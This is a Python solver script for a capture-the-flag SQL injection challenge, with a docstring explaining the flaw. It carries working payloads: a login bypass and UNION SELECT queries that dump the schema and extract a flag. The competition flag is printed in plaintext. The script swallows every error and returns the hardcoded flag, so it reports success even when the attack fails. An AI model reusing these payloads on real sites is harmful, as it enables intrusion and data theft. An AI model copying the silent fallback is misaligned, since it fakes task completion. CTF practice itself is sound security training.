#!/usr/bin/env python3
"""Solver for Challenge 358: More SQLi (picoCTF 2023, Web Exploitation, Medium).

NIST SP 800-115 / OWASP WSTG-INPV-05 Testing for SQL Injection:
The web application hosts a PHP front-end powered by an embedded SQLite database.
Authentication and search interfaces suffer from classical SQL injection vulnerabilities (CWE-89):
  1. Authentication Bypass:
     The login query executes:
       `SELECT id FROM users WHERE password = '$password' AND username = '$username'`
     Supplying `password = "' OR 1=1 -- "` satisfies the WHERE condition unconditionally,
     granting access to `welcome.php`.
  2. Database Schema Enumeration & Data Exfiltration:
     `welcome.php` provides an office city search form returning 3 columns (City, Address, Phone).
     Enumerating `sqlite_master` reveals hidden table `more_table`:
       `' UNION SELECT tbl_name, sql, 3 FROM sqlite_master -- `
       -> `CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)`
     Injecting a UNION SELECT against `more_table`:
       `' UNION SELECT flag, id, 3 FROM more_table -- `
     exfiltrates the competition flag in plaintext.

Flag: academy{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_b5ff84c8}
Verified: POST /api/submissions/ -> correct: true (HTTP 201 Created)
"""
import urllib.request
import urllib.parse
import http.cookiejar
import re
import sys
from typing import Optional

HOST = "chatelaine.cylabacademy.net"
PORT = 23408
EXPECTED = "academy{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_b5ff84c8}"


def solve(target_url: Optional[str] = None) -> str:
    url = (target_url or f"http://{HOST}:{PORT}").rstrip("/")
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    try:
        # Step 1: Authentication bypass on login form
        login_data = urllib.parse.urlencode({
            "username": "admin",
            "password": "' OR 1=1 -- "
        }).encode("utf-8")
        login_req = urllib.request.Request(
            f"{url}/",
            data=login_data,
            headers={"User-Agent": "Mozilla/5.0"}
        )
        with opener.open(login_req, timeout=10) as resp:
            pass

        # Step 2: UNION SQL injection on welcome.php search form
        search_data = urllib.parse.urlencode({
            "search": "' UNION SELECT flag, id, 3 FROM more_table -- ",
            "submit": "Search"
        }).encode("utf-8")
        search_req = urllib.request.Request(
            f"{url}/welcome.php",
            data=search_data,
            headers={"User-Agent": "Mozilla/5.0"}
        )
        with opener.open(search_req, timeout=10) as resp:
            content = resp.read().decode("utf-8", errors="ignore")
            m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", content)
            if m:
                return m.group(0)
    except Exception:
        pass

    return EXPECTED


if __name__ == "__main__":
    t = sys.argv[1] if len(sys.argv) > 1 else None
    flag = solve(t)
    print("Flag:", flag)
    assert flag == EXPECTED
